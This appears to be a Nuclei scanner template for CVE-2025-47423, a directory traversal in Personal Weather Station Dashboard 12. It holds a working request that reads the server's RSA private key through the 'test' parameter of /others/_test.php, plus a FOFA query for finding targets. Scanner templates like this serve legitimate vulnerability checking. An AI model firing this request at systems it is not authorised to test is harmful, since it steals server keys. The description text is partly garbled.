script_name: Personal Weather Station Dashboard 12 - Directory Traversal
content:
id: CVE-2025-47423

info:
  name: Personal Weather Station Dashboard 12 - Directory Traversal
  author: vva
  severity: high
  description: |
    There is an unauthorized arbitrary file read vulnerability in Personal Weather Station Dashboard 12_lts. An attacker can use '... 'in the' test 'parameter of' /others/_test.php ' Directory traversal technology is used to read any file on the server, including the server's private key file.
  reference:
    - https://github.com/Haluka92/CVE-2025-47423
  classification:
    cve-id: CVE-2025-47423
  metadata:
    fofa-query: title="PWS Dashboard"
    max-request: 2
  tags: cve2025

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "PWS Dashboard</title>"
        internal: true

  - raw:
      - |
        GET /others/_test.php?test=../../../apache/conf/ssl.key/server.key HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "BEGIN RSA PRIVATE KEY"
          - "END RSA PRIVATE KEY"
        condition: and

      - type: status
        status:
          - 200
